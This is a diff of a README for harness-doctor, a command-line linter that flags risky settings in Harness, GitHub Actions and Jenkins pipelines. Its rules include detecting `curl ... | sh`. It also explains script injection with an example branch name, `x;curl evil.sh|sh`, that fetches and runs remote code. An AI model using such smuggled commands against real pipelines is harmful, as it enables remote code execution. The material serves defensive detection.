@@ -1,29 +1,69 @@
-<div align="center">
-
 # harness-doctor
 
-**Lint Harness CI/CD pipelines before they reach production.**
-
 [![CI](https://github.com/gerardrecinto/harness-doctor/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/gerardrecinto/harness-doctor/actions/workflows/ci.yml)
-[![CodeQL](https://github.com/gerardrecinto/harness-doctor/actions/workflows/codeql.yml/badge.svg?branch=main)](https://github.com/gerardrecinto/harness-doctor/actions/workflows/codeql.yml)
-[![Release](https://img.shields.io/github/v/release/gerardrecinto/harness-doctor)](https://github.com/gerardrecinto/harness-doctor/releases)
-[![Python](https://img.shields.io/badge/python-3.10%20to%203.13-blue)](pyproject.toml)
 [![License](https://img.shields.io/github/license/gerardrecinto/harness-doctor)](LICENSE)
 
-<img src="docs/assets/demo.gif" alt="harness-doctor flags a pipeline with a literal token, a latest image and an unapproved prod deploy" width="760" />
+harness-doctor is a command-line tool that reads your CI/CD pipeline files and points out risky settings, with the line number and a fix. It is for people who write or review pipelines in Harness, GitHub Actions or Jenkins.
 
-</div>
+Put simply: it reads your pipeline files and warns you about risky settings before they cause a problem.
 
-Harness will happily save a pipeline that deploys `prod` with no approval, pulls `node:latest`, and keeps an API token in the YAML. harness-doctor reads your `.harness/` folder and tells you, with a line number and a fix.
+## Try it in 60 seconds
+
+You need Python 3.10 or newer. These commands install from the current `main` branch and lint a deliberately bad example.
 
 ```
-pip install "harness-doctor[schema] @ git+https://github.com/gerardrecinto/harness-doctor"
-harness-doctor .harness
+git clone https://github.com/gerardrecinto/harness-doctor && cd harness-doctor
+python -m venv .venv && . .venv/bin/activate
+pip install .
+harness-doctor check examples/bad/deploy.yaml
 ```
 
-## What it catches
+Output (trimmed):
 
-Run against [`examples/bad/deploy.yaml`](examples/bad/deploy.yaml):
+```
+    35  error    HD001  env var 'NPM_TOKEN' in step 'tag_release' holds a literal value
+                         fix: use <+secrets.getValue("npm_token")>
+    35  warning  HD003  image 'node:latest' in step 'tag_release' uses the latest tag
+                         fix: pin a version tag or an @sha256 digest
+    47  error    HD005  stage 'deploy_prod' deploys to 'prod' with no approval before it
+                         fix: add a HarnessApproval stage ahead of this one
+
+2 errors, 5 warnings, 1 info in 1 file
+```
+
+The command exits with code 1 because it found errors. `harness-doctor check examples/good` finds nothing and exits 0. To lint your own files, point `check` at a folder such as `.harness` or `.github/workflows`.
+
+There is also a browser demo that runs the same code, with nothing uploaded: https://gerardrecinto.github.io/harness-doctor/
+
+## What it does and does not do
+
+- It checks 25 rules: 9 for Harness pipelines, 9 for GitHub Actions workflows and 7 for Jenkinsfiles. Examples are a literal token, an image tagged `latest`, a production deploy with no approval, and untrusted text pasted into a script.
+- It reads one file at a time. It does not call Harness, resolve templates or runtime inputs, or know which secrets exist in your account.
+- A secret that does not look like a secret by name or format is not flagged.
+- It is a linter, not proof that a pipeline is safe.
+- The GitHub Actions and Jenkins rules are on `main` but not in the v0.1.1 release. Installing from `main`, as above, includes them. The v0.1.1 release and the GitHub Action pinned to it check Harness files only.
+- Jenkins checks read the Groovy text, so a pipeline that builds its stages dynamically can hide a finding.
+
+## More
+
+<details>
+<summary>Harness rules (HD001 to HD009)</summary>
+
+Put simply: each row is one mistake the tool looks for in Harness pipelines.
+
+| Rule | Severity | Catches |
+|------|----------|---------|
+| HD001 | error | Literal secrets in env vars, `String` variables, or credential-shaped strings |
+| HD002 | warning | Steps with no `timeout` |
+| HD003 | warning | Images with no tag, `:latest`, anything not pinned |
+| HD004 | warning | Deployment stages with no rollback path |
+| HD005 | error | Production deploys with no approval stage ahead of them |
+| HD006 | warning | `curl ... \| sh` |
+| HD007 | warning | Branch names, PR titles or commit messages interpolated into a script |
+| HD008 | warning | `privileged: true` |
+| HD009 | info | CI stages that run steps with no caching |
+
+`harness-doctor explain HD007` says why a rule exists. HD007 is the one most teams miss: Harness substitutes `<+codebase.branch>` into the script text before the shell parses it, so a branch named `x;curl evil.sh|sh` runs as code. Pass it through `envVariables` and read it quoted.
 
 ```
 examples/bad/deploy.yaml
@@ -47,21 +87,10 @@ examples/bad/deploy.yaml
 2 errors, 5 warnings, 1 info in 1 file
 ```
 
-| Rule | Severity | Catches |
-|------|----------|---------|
-| HD001 | error | Literal secrets in env vars, `String` variables, or credential-shaped strings |
-| HD002 | warning | Steps with no `timeout` |
-| HD003 | warning | Images with no tag, `:latest`, anything not pinned |
-| HD004 | warning | Deployment stages with no rollback path |
-| HD005 | error | Production deploys with no approval stage ahead of them |
-| HD006 | warning | `curl ... \| sh` |
-| HD007 | warning | Branch names, PR titles or commit messages interpolated into a script |
-| HD008 | warning | `privileged: true` |
-| HD009 | info | CI stages that run steps with no caching |
+</details>
 
-`harness-doctor explain HD007` says why a rule exists. HD007 is the one most teams miss: Harness substitutes `<+codebase.branch>` into the script text before the shell parses it, so a branch named `x;curl evil.sh|sh` runs as code. Pass it through `envVariables` and read it quoted.
-
-### GitHub Actions workflows and Jenkinsfiles
+<details>
+<summary>GitHub Actions and Jenkins rules (GA001 to GA009, JK001 to JK007)</summary>
 
 The same command checks `.github/workflows/*.yml` and any file named `Jenkinsfile*`, picking the rule set from the file itself. `harness-doctor check .github/workflows Jenkinsfile` runs both.
 
@@ -94,7 +123,12 @@ examples/bad/workflow.yml
 
 Jenkins checks read the Groovy text, not a parsed model, so they target declarative pipelines written in the usual style; a Jenkinsfile that builds its stages dynamically can hide a finding. Suppress one with `// harness-doctor: ignore JK002` above the line. `harness-doctor schema` validates Harness files only and skips the rest.
 
-## Use it
+</details>
+
+<details>
+<summary>Commands, output formats and suppressing a finding</summary>
+
+Put simply: these commands change how strict the check is and how the results are shown. SARIF is a standard report file that GitHub reads to show problems in its Security tab.
 
 ```
 harness-doctor check .harness                       # exit 1 on any error
@@ -115,7 +149,12 @@ Silence one finding with a comment on the line, or either of the two lines above
 
 Exit codes: `0` clean, `1` findings at or above `--fail-on`, `2` bad input.
 
-### GitHub Action
+</details>
+
+<details>
+<summary>GitHub Action and pre-commit</summary>
+
+Put simply: these run the check for you on every pull request or every commit.
 
 ```yaml
 permissions:
@@ -143,11 +182,19 @@ repos:
       - id: harness-doctor
 ```
 
-### Harness policy
+</details>
+
+<details>
+<summary>Harness policy (OPA)</summary>
+
+Put simply: this makes Harness itself refuse to save a risky pipeline.
 
 [`policies/pipeline_guardrails.rego`](policies/pipeline_guardrails.rego) enforces the image, timeout and prod-approval rules inside Harness itself. Add it to a policy set on the Pipeline entity, "On Save", and the save fails instead of waiting for someone to notice. It has OPA tests: `opa test --v0-compatible policies`.
 
-## The pipelines in `.harness/`
+</details>
+
+<details>
+<summary>The pipelines in .harness/</summary>
 
 This repo is built by the pipelines in [`.harness/`](.harness), and harness-doctor lints them on every run.
 
@@ -163,7 +210,10 @@ CI also runs on GitHub Actions ([`ci.yml`](.github/workflows/ci.yml)): tests on 
 
 To run them in your own account: import the folder with Git Experience, then create a GitHub connector with the identifier `github` at account level and a secret named `pypi_token`. Both are placeholders in the YAML.
 
-## Develop
+</details>
+
+<details>
+<summary>Develop</summary>
 
 ```
 python -m venv .venv && .venv/bin/pip install -e '.[dev]'
@@ -173,4 +223,6 @@ python -m venv .venv && .venv/bin/pip install -e '.[dev]'
 
 To add a rule, write a function in `src/harness_doctor/rules.py` decorated with `@rule(...)` that yields `(line, message, hint)`, and add a case to `tests/test_rules.py`.
 
-MIT licensed.
+</details>
+
+Changelog: [CHANGELOG.md](CHANGELOG.md). Contributing: [.github/CONTRIBUTING.md](.github/CONTRIBUTING.md). MIT licensed.
